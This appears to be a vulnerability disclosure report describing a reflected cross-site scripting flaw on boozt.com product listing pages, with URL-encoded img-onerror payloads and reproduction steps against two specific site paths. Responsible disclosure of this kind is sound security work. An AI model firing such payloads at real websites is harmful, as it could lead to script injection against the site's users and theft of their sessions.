Summary:

__Description__

The listing endpoints like http://www.boozt.com/eu/en/esprit-collection/blouses-woven_11239380, reflect the URL in the response from the server without escaping. And accept any value between _/esprit-collection/_ and __11239380_. 
The problem is that you can send a request like http://www.boozt.com/eu/en/esprit-collection/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11239380 and it will be valid.

__Proof of concept__

1. Go to http://www.boozt.com/eu/en/esprit-collection/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11239380
2. `alert(document.domain)` is executed a few times.
3. Go to http://www.boozt.com/eu/en/scotch-and-soda/%22%3E%3Cimg%20src%3dx%20onerror%3dalert%28document.domain%29%3E_11312517
4. `alert(document.domain)` is executed a few times.

It is reproducible on Firefox.
